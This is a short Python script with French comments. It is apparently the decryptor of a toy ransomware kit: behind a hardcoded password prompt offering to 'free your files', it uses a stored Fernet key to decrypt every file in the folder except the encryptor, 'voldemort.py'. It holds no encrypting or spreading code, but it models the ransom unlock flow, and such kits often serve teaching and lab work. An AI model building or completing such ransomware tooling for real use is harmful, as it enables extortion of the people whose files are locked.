#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# --- Étape 1 : Vérification du mot de passe ---
passphrase = "enisistourist"
user_phrase = input("Entrez le mot de passe pour libérer vos fichiers : ")

if user_phrase != passphrase:
    print("Mauvais mot de passe. Accès refusé.")
    exit()

# --- Étape 2 : Charger la clé ---
with open("thekey.key", "rb") as key_file:
    secret_key = key_file.read()

# --- Étape 3 : Trouver les fichiers encryptés ---
files = []
for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key" or file == "decryptor.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# --- Étape 4 : Décrypter ---
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    try:
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print(f"Fichier restauré : {file}")
    except Exception:
        print(f"Erreur sur : {file}")

print("Opération terminée.")
